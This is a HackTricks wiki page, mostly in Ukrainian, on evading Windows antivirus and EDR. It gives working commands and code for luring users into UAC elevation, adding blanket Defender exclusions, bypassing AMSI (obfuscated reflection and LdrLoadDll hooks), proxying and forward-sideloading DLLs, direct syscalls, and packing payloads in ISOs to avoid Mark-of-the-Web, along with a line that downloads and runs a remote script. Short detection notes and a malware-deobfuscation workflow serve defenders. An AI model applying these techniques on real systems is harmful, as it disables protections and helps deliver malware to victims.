# Antivirus (AV) Bypass

{{#include ../banners/hacktricks-training.md}}

**Спочатку цю сторінку написав** [**@m2rc_p**](https://twitter.com/m2rc_p)**!**

## Stop Defender

- [defendnot](https://github.com/es3n1n/defendnot): Tool для зупинки роботи Windows Defender.
- [no-defender](https://github.com/es3n1n/no-defender): Tool для зупинки роботи Windows Defender шляхом підробки іншого AV.
- [Disable Defender if you are admin](basic-powershell-for-pentesters/README.md)

### Installer-style UAC bait before tampering with Defender

Публічні loaders, що маскуються під game cheats, часто постачаються як непідписані Node.js/Nexe installers, які спочатку **просять у користувача elevation**, а вже потім нейтралізують Defender. Потік простий:

1. Перевірити наявність administrative context за допомогою `net session`. Команда успішно виконується лише тоді, коли в caller є admin rights, тож збій означає, що loader запущено як standard user.
2. Негайно перезапустити себе з verb `RunAs`, щоб викликати очікуване UAC consent prompt, зберігши при цьому original command line.
```powershell
if (-not (net session 2>$null)) {
powershell -WindowStyle Hidden -Command "Start-Process cmd.exe -Verb RunAs -WindowStyle Hidden -ArgumentList '/c ""`<path_to_loader`>""'"
exit
}
```
Жертви вже вважають, що встановлюють “cracked” software, тому запит зазвичай приймається, надаючи malware потрібні права для зміни policy Defender.

### Blanket `MpPreference` exclusions for every drive letter

Після підвищення привілеїв ланцюжки в стилі GachiLoader максимізують blind spots Defender замість того, щоб повністю вимикати службу. Loader спочатку завершує GUI watchdog (`taskkill /F /IM SecHealthUI.exe`), а потім додає **надзвичайно широкі exclusions**, щоб кожен user profile, system directory і removable disk став недоступним для сканування:
```powershell
$targets = @('C:\Users\', 'C:\ProgramData\', 'C:\Windows\')
Get-PSDrive -PSProvider FileSystem | ForEach-Object { $targets += $_.Root }
$targets | Sort-Object -Unique | ForEach-Object { Add-MpPreference -ExclusionPath $_ }
Add-MpPreference -ExclusionExtension '.sys'
```
Ключові спостереження:

- Цикл проходить по кожній змонтованій файловій системі (D:\, E:\, USB sticks, тощо), тож **будь-який майбутній payload, розміщений будь-де на диску, ігнорується**.
- Виключення для розширення `.sys` є перспективним — attackers залишають собі опцію завантажувати unsigned drivers пізніше, не торкаючись Defender знову.
- Усі зміни потрапляють до `HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions`, тож пізніші етапи можуть підтвердити, що exclusions зберігаються, або розширити їх без повторного спрацювання UAC.

Оскільки службу Defender не зупиняють, наївні health checks і далі показують “antivirus active”, хоча real-time inspection фактично не торкається цих шляхів.

## **AV Evasion Methodology**

Наразі AV використовують різні методи для перевірки, чи є файл malicious чи ні: static detection, dynamic analysis, а для більш просунутих EDR — behavioural analysis.

### **Static detection**

Static detection досягається шляхом позначення відомих malicious strings або масивів байтів у binary чи script, а також вилученням інформації безпосередньо з файлу (наприклад, file description, company name, digital signatures, icon, checksum, тощо). Це означає, що використання відомих public tools може призвести до того, що вас зловлять швидше, оскільки їх, імовірно, вже проаналізували та позначили як malicious. Є кілька способів обійти такий тип detection:

- **Encryption**

Якщо ви encrypt binary, AV не зможе виявити вашу program, але вам знадобиться якийсь loader, щоб decrypt і запустити program у memory.

- **Obfuscation**

Іноді все, що потрібно, — це змінити кілька strings у вашому binary або script, щоб пройти AV, але це може бути довготривалою задачею залежно від того, що саме ви намагаєтеся obfuscate.

- **Custom tooling**

Якщо ви розробляєте власні tools, не буде відомих bad signatures, але це потребує багато часу та зусиль.

> [!TIP]
> Хороший спосіб перевірити static detection у Windows Defender — [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck). Він, по суті, розбиває файл на кілька сегментів і потім просить Defender сканувати кожен окремо; так можна точно визначити, які саме strings або bytes у вашому binary позначені.

Я дуже рекомендую ознайомитися з цим [YouTube playlist](https://www.youtube.com/playlist?list=PLj05gPj8rk_pkb12mDe4PgYZ5qPxhGKGf) про practical AV Evasion.

### **Dynamic analysis**

Dynamic analysis — це коли AV запускає ваш binary у sandbox і відстежує malicious activity (наприклад, спроби decrypt і прочитати паролі браузера, виконання minidump на LSASS, тощо). З цією частиною працювати трохи складніше, але ось що можна зробити, щоб обійти sandboxes.

- **Sleep before execution** Залежно від реалізації, це може бути чудовим способом bypass AV dynamic analysis. AV мають дуже мало часу на сканування файлів, щоб не переривати робочий процес користувача, тож довгі sleep можуть завадити аналізу binary. Проблема в тому, що багато sandbox у AV можуть просто пропускати sleep залежно від того, як це реалізовано.
- **Checking machine's resources** Зазвичай Sandboxes мають дуже мало ресурсів (наприклад, < 2GB RAM), інакше вони могли б сповільнити машину користувача. Тут також можна бути дуже креативним, наприклад, перевіряти температуру CPU або навіть швидкість обертання вентиляторів — не все буде реалізовано в sandbox.
- **Machine-specific checks** Якщо ви хочете атакувати користувача, чия workstation приєднана до домену "contoso.local", можна перевірити домен комп’ютера і подивитися, чи збігається він із вказаним вами; якщо ні, можна завершити роботу вашої program.

Виявилося, що computername Sandbox у Microsoft Defender — HAL9TH, тож ви можете перевіряти computer name у своєму malware перед detonation; якщо ім’я збігається з HAL9TH, це означає, що ви всередині sandbox Defender, тож можна завершити роботу вашої program.

<figure><img src="../images/image (209).png" alt=""><figcaption><p>source: <a href="https://youtu.be/StSLxFbVz0M?t=1439">https://youtu.be/StSLxFbVz0M?t=1439</a></p></figcaption></figure>

Декілька інших дуже корисних порад від [@mgeeky](https://twitter.com/mariuszbit) для роботи проти Sandboxes

<figure><img src="../images/image (248).png" alt=""><figcaption><p><a href="https://discord.com/servers/red-team-vx-community-1012733841229746240">Red Team VX Discord</a> #malware-dev channel</p></figcaption></figure>

Як ми вже казали раніше в цьому post, **public tools** зрештою **будуть detected**, тож вам варто поставити собі питання:

Наприклад, якщо ви хочете dump LSASS, **чи справді вам потрібно використовувати mimikatz**? Чи можна взяти інший project, який менш відомий і також dump LSASS.

Правильна відповідь, імовірно, — другий варіант. Якщо взяти mimikatz як приклад, це, мабуть, один із найбільш flagged piece of malware, якщо не найчастіше flagged, серед AV та EDR; сам project дуже крутий, але працювати з ним, щоб обійти AV, — справжній nightmare, тож просто шукайте alternatives для того, чого ви намагаєтесь досягти.

> [!TIP]
> Коли ви модифікуєте свої payloads для evasion, переконайтеся, що **вимкнули automatic sample submission** у defender, і, будь ласка, серйозно, **НЕ ЗАВАНТАЖУЙТЕ ДО VIRUSTOTAL**, якщо ваша мета — досягти evasion у довгостроковій перспективі. Якщо хочете перевірити, чи ваш payload виявляється конкретним AV, встановіть його у VM, спробуйте вимкнути automatic sample submission і тестуйте там, доки не будете задоволені результатом.

## EXEs vs DLLs

Щоразу, коли це можливо, завжди **надавайте пріоритет DLLs для evasion**; з мого досвіду, DLL файли зазвичай **значно рідше detected** і analyzed, тож це дуже простий трюк, який можна використати, щоб уникнути detection у деяких випадках (якщо ваш payload, звісно, має спосіб запуску як DLL).

Як видно на цьому зображенні, DLL Payload з Havoc має detection rate 4/26 в antiscan.me, тоді як EXE payload має detection rate 7/26.

<figure><img src="../images/image (1130).png" alt=""><figcaption><p>antiscan.me comparison of a normal Havoc EXE payload vs a normal Havoc DLL</p></figcaption></figure>

Тепер покажемо кілька трюків, які можна використати з DLL файлами, щоб бути значно stealthier.

## DLL Sideloading & Proxying

**DLL Sideloading** використовує порядок пошуку DLL, який застосовує loader, розміщуючи як victim application, так і malicious payload(s) поруч один з одним.

Ви можете перевіряти програми, вразливі до DLL Sideloading, за допомогою [Siofra](https://github.com/Cybereason/siofra) та такого powershell script:
```bash
Get-ChildItem -Path "C:\Program Files\" -Filter *.exe -Recurse -File -Name| ForEach-Object {
$binarytoCheck = "C:\Program Files\" + $_
C:\Users\user\Desktop\Siofra64.exe --mode file-scan --enum-dependency --dll-hijack -f $binarytoCheck
}
```
Ця команда виведе список програм, вразливих до DLL hijacking всередині "C:\Program Files\\", і DLL-файли, які вони намагаються завантажити.

Я настійно рекомендую вам **самостійно досліджувати DLL Hijackable/Sideloadable programs**, ця техніка досить stealthy, якщо все зробити правильно, але якщо ви використаєте publicly known DLL Sideloadable programs, вас можуть легко зловити.

Просто розміщення malicious DLL з іменем, яке програма очікує завантажити, не завантажить ваш payload, оскільки програма очікує певні specific functions всередині цієї DLL, щоб виправити цю проблему, ми використаємо іншу техніку, яка називається **DLL Proxying/Forwarding**.

**DLL Proxying** перенаправляє виклики, які програма робить до proxy (і malicious) DLL, до original DLL, тим самим зберігаючи функціональність програми та даючи змогу обробити execution вашого payload.

Я буду використовувати проєкт [SharpDLLProxy](https://github.com/Flangvik/SharpDllProxy) від [@flangvik](https://twitter.com/Flangvik/)

Ось кроки, які я виконав:
```
1. Find an application vulnerable to DLL Sideloading (siofra or using Process Hacker)
2. Generate some shellcode (I used Havoc C2)
3. (Optional) Encode your shellcode using Shikata Ga Nai (https://github.com/EgeBalci/sgn)
4. Use SharpDLLProxy to create the proxy dll (.\SharpDllProxy.exe --dll .\mimeTools.dll --payload .\demon.bin)
```
Остання команда дасть нам 2 файли: шаблон вихідного коду DLL і початкову перейменовану DLL.

<figure><img src="../images/sharpdllproxy.gif" alt=""><figcaption></figcaption></figure>
```
5. Create a new visual studio project (C++ DLL), paste the code generated by SharpDLLProxy (Under output_dllname/dllname_pragma.c) and compile. Now you should have a proxy dll which will load the shellcode you've specified and also forward any calls to the original DLL.
```
Ось результати:

<figure><img src="../images/dll_sideloading_demo.gif" alt=""><figcaption></figcaption></figure>

І наш shellcode (закодований за допомогою [SGN](https://github.com/EgeBalci/sgn)), і proxy DLL мають 0/26 Detection rate на [antiscan.me](https://antiscan.me)! Я б назвав це успіхом.

<figure><img src="../images/image (193).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Я **дуже рекомендую** вам подивитися [S3cur3Th1sSh1t's twitch VOD](https://www.twitch.tv/videos/1644171543) про DLL Sideloading, а також [ippsec's video](https://www.youtube.com/watch?v=3eROsG_WNpE), щоб дізнатися більше про те, що ми обговорювали детальніше.

### Abusing Forwarded Exports (ForwardSideLoading)

Windows PE modules can export functions that are actually "forwarders": instead of pointing to code, the export entry contains an ASCII string of the form `TargetDll.TargetFunc`. When a caller resolves the export, the Windows loader will:

- Load `TargetDll` if not already loaded
- Resolve `TargetFunc` from it

Key behaviors to understand:
- If `TargetDll` is a KnownDLL, it is supplied from the protected KnownDLLs namespace (e.g., ntdll, kernelbase, ole32).
- If `TargetDll` is not a KnownDLL, the normal DLL search order is used, which includes the directory of the module that is doing the forward resolution.

This enables an indirect sideloading primitive: find a signed DLL that exports a function forwarded to a non-KnownDLL module name, then co-locate that signed DLL with an attacker-controlled DLL named exactly as the forwarded target module. When the forwarded export is invoked, the loader resolves the forward and loads your DLL from the same directory, executing your DllMain.

Example observed on Windows 11:
```
keyiso.dll KeyIsoSetAuditingInterface -> NCRYPTPROV.SetAuditingInterface
```
`NCRYPTPROV.dll` не є KnownDLL, тому він розв’язується через звичайний порядок пошуку.

PoC (copy-paste):
1) Скопіюйте підписану системну DLL до папки, у яку можна записувати
```
copy C:\Windows\System32\keyiso.dll C:\test\
```
2) Скинь шкідливий `NCRYPTPROV.dll` у ту саму папку. Мінімального `DllMain` достатньо, щоб отримати виконання коду; тобі не потрібно реалізовувати forwarded function, щоб викликати `DllMain`.
```c
// x64: x86_64-w64-mingw32-gcc -shared -o NCRYPTPROV.dll ncryptprov.c
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE hinst, DWORD reason, LPVOID reserved){
if (reason == DLL_PROCESS_ATTACH){
HANDLE h = CreateFileA("C\\\\test\\\\DLLMain_64_DLL_PROCESS_ATTACH.txt", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
if(h!=INVALID_HANDLE_VALUE){ const char *m = "hello"; DWORD w; WriteFile(h,m,5,&w,NULL); CloseHandle(h);}
}
return TRUE;
}
```
3) Запустіть forward за допомогою підписаного LOLBin:
```
rundll32.exe C:\test\keyiso.dll, KeyIsoSetAuditingInterface
```
Спостережувана поведінка:
- rundll32 (signed) завантажує side-by-side `keyiso.dll` (signed)
- Під час резольвінгу `KeyIsoSetAuditingInterface` loader переходить по forward до `NCRYPTPROV.SetAuditingInterface`
- Потім loader завантажує `NCRYPTPROV.dll` з `C:\test` і виконує його `DllMain`
- Якщо `SetAuditingInterface` не реалізовано, ви отримаєте помилку "missing API" лише після того, як `DllMain` уже відпрацював

Поради для hunting:
- Зосередьтеся на forwarded exports, де target module не є KnownDLL. KnownDLLs перелічені в `HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs`.
- Ви можете перерахувати forwarded exports за допомогою tooling, такого як:
```
dumpbin /exports C:\Windows\System32\keyiso.dll
# forwarders appear with a forwarder string e.g., NCRYPTPROV.SetAuditingInterface
```
- Дивіться Windows 11 forwarder inventory, щоб шукати кандидати: https://hexacorn.com/d/apis_fwd.txt

Ідеї для detection/defense:
- Моніторте LOLBins (наприклад, rundll32.exe), які завантажують signed DLLs з non-system шляхів, а потім завантажують non-KnownDLLs з тим самим базовим ім’ям з цього каталогу
- Створюйте alert на ланцюжки process/module на кшталт: `rundll32.exe` → non-system `keyiso.dll` → `NCRYPTPROV.dll` у user-writable шляхах
- Застосовуйте code integrity policies (WDAC/AppLocker) і забороняйте write+execute в application directories

## [**Freeze**](https://github.com/optiv/Freeze)

`Freeze is a payload toolkit for bypassing EDRs using suspended processes, direct syscalls, and alternative execution methods`

Ви можете використовувати Freeze, щоб завантажити та виконати ваш shellcode stealthy способом.
```
Git clone the Freeze repo and build it (git clone https://github.com/optiv/Freeze.git && cd Freeze && go build Freeze.go)
1. Generate some shellcode, in this case I used Havoc C2.
2. ./Freeze -I demon.bin -encrypt -O demon.exe
3. Profit, no alerts from defender
```
<figure><img src="../images/freeze_demo_hacktricks.gif" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Evation — це лише гра в кота й мишу: те, що працює сьогодні, завтра можуть виявити, тож ніколи не покладайся лише на один інструмент; якщо можливо, спробуй поєднувати кілька evasion techniques.

## Direct/Indirect Syscalls & SSN Resolution (SysWhispers4)

EDR часто ставлять **user-mode inline hooks** на syscall stubs у `ntdll.dll`. Щоб обійти ці hooks, можна згенерувати **direct** або **indirect** syscall stubs, які завантажують правильний **SSN** (System Service Number) і переходять у kernel mode, не виконуючи hook-нутий export entrypoint.

**Invocation options:**
- **Direct (embedded)**: вставляє інструкцію `syscall`/`sysenter`/`SVC #0` у згенерований stub (без переходу через `ntdll` export).
- **Indirect**: стрибає в наявний `syscall` gadget всередині `ntdll`, щоб перехід у kernel виглядав таким, ніби він походить з `ntdll` (корисно для heuristic evasion); **randomized indirect** вибирає gadget із пулу для кожного виклику.
- **Egg-hunt**: уникає вбудовування статичної послідовності `0F 05` opcode на диску; розв'язує syscall sequence під час виконання.

**Hook-resistant SSN resolution strategies:**
- **FreshyCalls (VA sort)**: визначає SSN, сортуючи syscall stubs за virtual address, а не читаючи bytes stub.
- **SyscallsFromDisk**: монтує чистий `\KnownDlls\ntdll.dll`, читає SSN з його `.text`, потім розмонтовує (обходить усі in-memory hooks).
- **RecycledGate**: поєднує VA-sorted SSN inference з перевіркою opcode, коли stub чистий; якщо він hook-нутий, переходить до VA inference.
- **HW Breakpoint**: ставить DR0 на інструкцію `syscall` і використовує VEH, щоб зчитати SSN з `EAX` під час виконання, без парсингу hook-нутих bytes.

Example SysWhispers4 usage:
```bash
# Indirect syscalls + hook-resistant resolution
python syswhispers.py --preset injection --method indirect --resolve recycled

# Resolve SSNs from a clean on-disk ntdll
python syswhispers.py --preset injection --method indirect --resolve from_disk --unhook-ntdll

# Hardware breakpoint SSN extraction
python syswhispers.py --functions NtAllocateVirtualMemory,NtCreateThreadEx --resolve hw_breakpoint
```
## AMSI (Anti-Malware Scan Interface)

AMSI was created to prevent "[fileless malware](https://en.wikipedia.org/wiki/Fileless_malware)". Initially, AVs were only capable of scanning **files on disk**, so if you could somehow execute payloads **directly in-memory**, the AV couldn't do anything to prevent it, as it didn't have enough visibility.

The AMSI feature is integrated into these components of Windows.

- User Account Control, or UAC (elevation of EXE, COM, MSI, or ActiveX installation)
- PowerShell (scripts, interactive use, and dynamic code evaluation)
- Windows Script Host (wscript.exe and cscript.exe)
- JavaScript and VBScript
- Office VBA macros

Вона дає змогу antivirus-рішенням перевіряти поведінку скриптів, відкриваючи вміст скриптів у вигляді, який є і незашифрованим, і не обфускованим.

Запуск `IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1')` призведе до такого попередження в Windows Defender.

<figure><img src="../images/image (1135).png" alt=""><figcaption></figcaption></figure>

Зверніть увагу, як перед шляхом до виконуваного файла, з якого було запущено скрипт, додається `amsi:`; у цьому випадку це powershell.exe

Ми не записували жодного файла на диск, але все одно були виявлені в-memory через AMSI.

Більше того, починаючи з **.NET 4.8**, код C# також проходить через AMSI. Це навіть впливає на `Assembly.Load(byte[])` для завантаження виконання в-memory. Ось чому для виконання в-memory, якщо ви хочете обходити AMSI, рекомендується використовувати нижчі версії .NET (наприклад, 4.7.2 або нижче).

Є кілька способів обійти AMSI:

- **Obfuscation**

Оскільки AMSI переважно працює зі static detections, то модифікація скриптів, які ви намагаєтеся завантажити, може бути хорошим способом уникнення виявлення.

Однак AMSI має можливість deobfuscating скриптів навіть якщо вони мають кілька шарів, тому obfuscation може бути поганим варіантом залежно від того, як саме її виконано. Через це обхід не такий уже й straightforward. Хоча інколи достатньо просто змінити кілька назв змінних, і все спрацює, тож це залежить від того, наскільки щось було позначено як підозріле.

- **AMSI Bypass**

Оскільки AMSI реалізовано шляхом завантаження DLL у process powershell (також cscript.exe, wscript.exe тощо), його можна легко змінити навіть працюючи як unprivileged user. Через цю ваду в реалізації AMSI дослідники знайшли кілька способів обійти AMSI scanning.

**Forcing an Error**

Примусове збої в ініціалізації AMSI (amsiInitFailed) призведе до того, що для поточного process не буде розпочато жодного scan. Спочатку це було оприлюднено [Matt Graeber](https://twitter.com/mattifestation), а Microsoft розробила signature, щоб запобігти ширшому використанню.
```bash
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```
Все, що знадобилося, — це один рядок коду powershell, щоб зробити AMSI непридатним для поточного powershell process. Цей рядок, звісно, був позначений самим AMSI, тож потрібна певна модифікація, щоб використовувати цю technique.

Ось modified AMSI bypass, який я взяв із цього [Github Gist](https://gist.github.com/r00t-3xp10it/a0c6a368769eec3d3255d4814802b5db).
```bash
Try{#Ams1 bypass technic nº 2
$Xdatabase = 'Utils';$Homedrive = 'si'
$ComponentDeviceId = "N`onP" + "ubl`ic" -join ''
$DiskMgr = 'Syst+@.MÂ£nÂ£g' + 'e@+nt.Auto@' + 'Â£tion.A' -join ''
$fdx = '@ms' + 'Â£InÂ£' + 'tF@Â£' + 'l+d' -Join '';Start-Sleep -Milliseconds 300
$CleanUp = $DiskMgr.Replace('@','m').Replace('Â£','a').Replace('+','e')
$Rawdata = $fdx.Replace('@','a').Replace('Â£','i').Replace('+','e')
$SDcleanup = [Ref].Assembly.GetType(('{0}m{1}{2}' -f $CleanUp,$Homedrive,$Xdatabase))
$Spotfix = $SDcleanup.GetField($Rawdata,"$ComponentDeviceId,Static")
$Spotfix.SetValue($null,$true)
}Catch{Throw $_}
```
Майте на увазі, що це, ймовірно, буде позначено, щойно цей пост вийде, тож не публікуйте жодного code, якщо ваш план — залишатися undetected.

**Memory Patching**

Ця technique була вперше виявлена [@RastaMouse](https://twitter.com/_RastaMouse/) і вона полягає в пошуку address для функції "AmsiScanBuffer" у amsi.dll (яка відповідає за сканування user-supplied input) та перезаписі її інструкціями, щоб повернути code для E_INVALIDARG, таким чином результат actual scan поверне 0, що інтерпретується як clean result.

> [!TIP]
> Будь ласка, прочитайте [https://rastamouse.me/memory-patching-amsi-bypass/](https://rastamouse.me/memory-patching-amsi-bypass/) для більш детального пояснення.

Також існує багато інших techniques, що використовуються для обходу AMSI за допомогою powershell, перегляньте [**this page**](basic-powershell-for-pentesters/index.html#amsi-bypass) і [**this repo**](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell), щоб дізнатися про них більше.

### Blocking AMSI by preventing amsi.dll load (LdrLoadDll hook)

AMSI ініціалізується лише після того, як `amsi.dll` завантажено в current process. Надійний, language‑agnostic bypass — це розмістити user‑mode hook на `ntdll!LdrLoadDll`, який повертає error, коли requested module є `amsi.dll`. У результаті AMSI ніколи не завантажується, і для цього process не відбувається жодного scan.

Implementation outline (x64 C/C++ pseudocode):
```c
#include <windows.h>
#include <winternl.h>

typedef NTSTATUS (NTAPI *pLdrLoadDll)(PWSTR, ULONG, PUNICODE_STRING, PHANDLE);
static pLdrLoadDll realLdrLoadDll;

NTSTATUS NTAPI Hook_LdrLoadDll(PWSTR path, ULONG flags, PUNICODE_STRING module, PHANDLE handle){
if (module && module->Buffer){
UNICODE_STRING amsi; RtlInitUnicodeString(&amsi, L"amsi.dll");
if (RtlEqualUnicodeString(module, &amsi, TRUE)){
// Pretend the DLL cannot be found → AMSI never initialises in this process
return STATUS_DLL_NOT_FOUND; // 0xC0000135
}
}
return realLdrLoadDll(path, flags, module, handle);
}

void InstallHook(){
HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
realLdrLoadDll = (pLdrLoadDll)GetProcAddress(ntdll, "LdrLoadDll");
// Apply inline trampoline or IAT patching to redirect to Hook_LdrLoadDll
// e.g., Microsoft Detours / MinHook / custom 14‑byte jmp thunk
}
```
Notes
- Works across PowerShell, WScript/CScript and custom loaders alike (anything that would otherwise load AMSI).
- Pair with feeding scripts over stdin (`PowerShell.exe -NoProfile -NonInteractive -Command -`) to avoid long command‑line artefacts.
- Seen used by loaders executed through LOLBins (e.g., `regsvr32` calling `DllRegisterServer`).

The tool **[https://github.com/Flangvik/AMSI.fail](https://github.com/Flangvik/AMSI.fail)** also generates script to bypass AMSI.
The tool **[https://amsibypass.com/](https://amsibypass.com/)** also generates script to bypass AMSI that avoid signature by randomized user-defined function, variables, characters expression and applies random character casing to PowerShell keywords to avoid signature.

**Remove the detected signature**

You can use a tool such as **[https://github.com/cobbr/PSAmsi](https://github.com/cobbr/PSAmsi)** and **[https://github.com/RythmStick/AMSITrigger](https://github.com/RythmStick/AMSITrigger)** to remove the detected AMSI signature from the memory of the current process. This tool works by scanning the memory of the current process for the AMSI signature and then overwriting it with NOP instructions, effectively removing it from memory.

**AV/EDR products that uses AMSI**

You can find a list of AV/EDR products that uses AMSI in **[https://github.com/subat0mik/whoamsi](https://github.com/subat0mik/whoamsi)**.

**Use Powershell version 2**
If you use PowerShell version 2, AMSI will not be loaded, so you can run your scripts without being scanned by AMSI. You can do this:
```bash
powershell.exe -version 2
```
## PS Logging

PowerShell logging — це функція, яка дозволяє записувати всі команди PowerShell, виконані в системі. Це може бути корисним для аудиту та усунення несправностей, але також може бути **проблемою для attackers, які хочуть уникнути виявлення**.

Щоб обійти PowerShell logging, можна використати такі техніки:

- **Disable PowerShell Transcription and Module Logging**: Для цього можна використати інструмент, наприклад [https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs](https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs).
- **Use Powershell version 2**: Якщо ви використовуєте PowerShell version 2, AMSI не буде завантажено, тож ви зможете запускати свої скрипти без сканування AMSI. Це можна зробити так: `powershell.exe -version 2`
- **Use an Unmanaged Powershell Session**: Використовуйте [https://github.com/leechristensen/UnmanagedPowerShell](https://github.com/leechristensen/UnmanagedPowerShell), щоб запустити powershell без defenses (саме це використовує `powerpick` з Cobal Strike).


## Obfuscation

> [!TIP]
> Кілька obfuscation techniques покладаються на шифрування даних, що збільшить entropy бінарника, і це полегшить AVs та EDRs його виявлення. Будьте обережні з цим і, можливо, застосовуйте шифрування лише до конкретних секцій вашого коду, які є чутливими або потребують приховування.

### Deobfuscating ConfuserEx-Protected .NET Binaries

Під час аналізу malware, що використовує ConfuserEx 2 (або комерційні форки), часто доводиться мати справу з кількома шарами захисту, які блокують decompilers і sandboxes. Наведений нижче workflow надійно **відновлює майже оригінальний IL**, який потім можна деcompile до C# у таких інструментах, як dnSpy або ILSpy.

1.  Anti-tampering removal – ConfuserEx шифрує кожне *method body* і розшифровує його всередині статичного конструктора *module* (`<Module>.cctor`). Це також патчить PE checksum, тож будь-яка модифікація спричинить аварійне завершення binary. Використайте **AntiTamperKiller**, щоб знайти зашифровані metadata tables, відновити XOR keys і переписати чистий assembly:
```bash
# https://github.com/wwh1004/AntiTamperKiller
python AntiTamperKiller.py Confused.exe Confused.clean.exe
```
Output містить 6 anti-tamper параметрів (`key0-key3`, `nameHash`, `internKey`), які можуть бути корисними під час створення власного unpacker.

2.  Symbol / control-flow recovery – передайте *clean* файл у **de4dot-cex** (fork de4dot, що враховує ConfuserEx).
```bash
de4dot-cex -p crx Confused.clean.exe -o Confused.de4dot.exe
```
Flags:
• `-p crx` – вибір профілю ConfuserEx 2
• de4dot скасує control-flow flattening, відновить оригінальні namespaces, classes і variable names та розшифрує constant strings.

3.  Proxy-call stripping – ConfuserEx замінює прямі method calls на легкі wrappers (так звані *proxy calls*), щоб ще більше ускладнити decompilation.  Видаліть їх за допомогою **ProxyCall-Remover**:
```bash
ProxyCall-Remover.exe Confused.de4dot.exe Confused.fixed.exe
```
Після цього кроку ви маєте побачити звичайні .NET API, такі як `Convert.FromBase64String` або `AES.Create()`, замість неясних wrapper functions (`Class8.smethod_10`, …).

4.  Manual clean-up – запустіть отриманий binary у dnSpy, знайдіть великі Base64 blobs або використання `RijndaelManaged`/`TripleDESCryptoServiceProvider`, щоб виявити *real* payload. Часто malware зберігає його як TLV-encoded byte array, ініціалізований всередині `<Module>.byte_0`.

Наведена вище chain відновлює execution flow **без** потреби запускати malicious sample – корисно під час роботи на offline workstation.

> 🛈  ConfuserEx створює custom attribute з назвою `ConfusedByAttribute`, який можна використовувати як IOC для автоматичної triage samples.

#### One-liner
```bash
autotok.sh Confused.exe  # wrapper that performs the 3 steps above sequentially
```
---

- [**InvisibilityCloak**](https://github.com/h4wkst3r/InvisibilityCloak)**: C# obfuscator**
- [**Obfuscator-LLVM**](https://github.com/obfuscator-llvm/obfuscator): Мета цього проєкту — надати open-source форк [LLVM](http://www.llvm.org/) compilation suite, здатний підвищити безпеку software через [code obfuscation](<http://en.wikipedia.org/wiki/Obfuscation_(software)>) і tamper-proofing.
- [**ADVobfuscator**](https://github.com/andrivet/ADVobfuscator): ADVobfuscator демонструє, як використовувати `C++11/14` language для генерації на етапі compile time obfuscated code без використання будь-яких external tool і без модифікації compiler.
- [**obfy**](https://github.com/fritzone/obfy): Додає шар obfuscated operations, згенерованих C++ template metaprogramming framework, що ускладнить життя person wanting to crack the application.
- [**Alcatraz**](https://github.com/weak1337/Alcatraz)**:** Alcatraz — це x64 binary obfuscator, який здатен obfuscate різні pe files, включно з: .exe, .dll, .sys
- [**metame**](https://github.com/a0rtega/metame): Metame — це простий metamorphic code engine для arbitrary executables.
- [**ropfuscator**](https://github.com/ropfuscator/ropfuscator): ROPfuscator — це framework для fine-grained code obfuscation для мов, які підтримує LLVM, using ROP (return-oriented programming). ROPfuscator obfuscates program на assembly code level шляхом трансформації regular instructions у ROP chains, thwarting our natural conception of normal control flow.
- [**Nimcrypt**](https://github.com/icyguider/nimcrypt): Nimcrypt — це .NET PE Crypter, written in Nim
- [**inceptor**](https://github.com/klezVirus/inceptor)**:** Inceptor здатний convert existing EXE/DLL into shellcode і потім load them

## SmartScreen & MoTW

Ви могли бачити цей екран під час завантаження деяких executables з internet і їх запуску.

Microsoft Defender SmartScreen — це security mechanism, призначений захищати end user від запуску potentially malicious applications.

<figure><img src="../images/image (664).png" alt=""><figcaption></figcaption></figure>

SmartScreen mainly works with a reputation-based approach, meaning that uncommonly download applications will trigger SmartScreen, thus alerting and preventing the end user from executing the file (although the file can still be executed by clicking More Info -> Run anyway).

**MoTW** (Mark of The Web) is an [NTFS Alternate Data Stream](<https://en.wikipedia.org/wiki/NTFS#Alternate_data_stream_(ADS)>) with the name of Zone.Identifier, which is automatically created when downloading files from the internet, along with the URL it was downloaded from.

<figure><img src="../images/image (237).png" alt=""><figcaption><p>Перевірка ADS Zone.Identifier для file, downloaded from the internet.</p></figcaption></figure>

> [!TIP]
> Важливо зазначити, що executables, signed with a **trusted** signing certificate, **won't trigger SmartScreen**.

Дуже ефективний спосіб запобігти потраплянню ваших payloads під Mark of The Web — пакувати їх усередину якогось контейнера, наприклад ISO. Це відбувається тому, що Mark-of-the-Web (MOTW) **cannot** be applied to **non NTFS** volumes.

<figure><img src="../images/image (640).png" alt=""><figcaption></figcaption></figure>

[**PackMyPayload**](https://github.com/mgeeky/PackMyPayload/) — це tool, який пакує payloads у output containers, щоб evade Mark-of-the-Web.

Example usage:
```bash
PS C:\Tools\PackMyPayload> python .\PackMyPayload.py .\TotallyLegitApp.exe container.iso

+      o     +              o   +      o     +              o
+             o     +           +             o     +         +
o  +           +        +           o  +           +          o
-_-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-_-_-_-_-_-_-_,------,      o
:: PACK MY PAYLOAD (1.1.0)       -_-_-_-_-_-_-|   /\_/\
for all your container cravings   -_-_-_-_-_-~|__( ^ .^)  +    +
-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-__-_-_-_-_-_-_-''  ''
+      o         o   +       o       +      o         o   +       o
+      o            +      o    ~   Mariusz Banach / mgeeky    o
o      ~     +           ~          <mb [at] binary-offensive.com>
o           +                         o           +           +

[.] Packaging input file to output .iso (iso)...
Burning file onto ISO:
Adding file: /TotallyLegitApp.exe

[+] Generated file written to (size: 3420160): container.iso
```
Ось демо для обходу SmartScreen шляхом пакування payloads всередині ISO файлів за допомогою [PackMyPayload](https://github.com/mgeeky/PackMyPayload/)

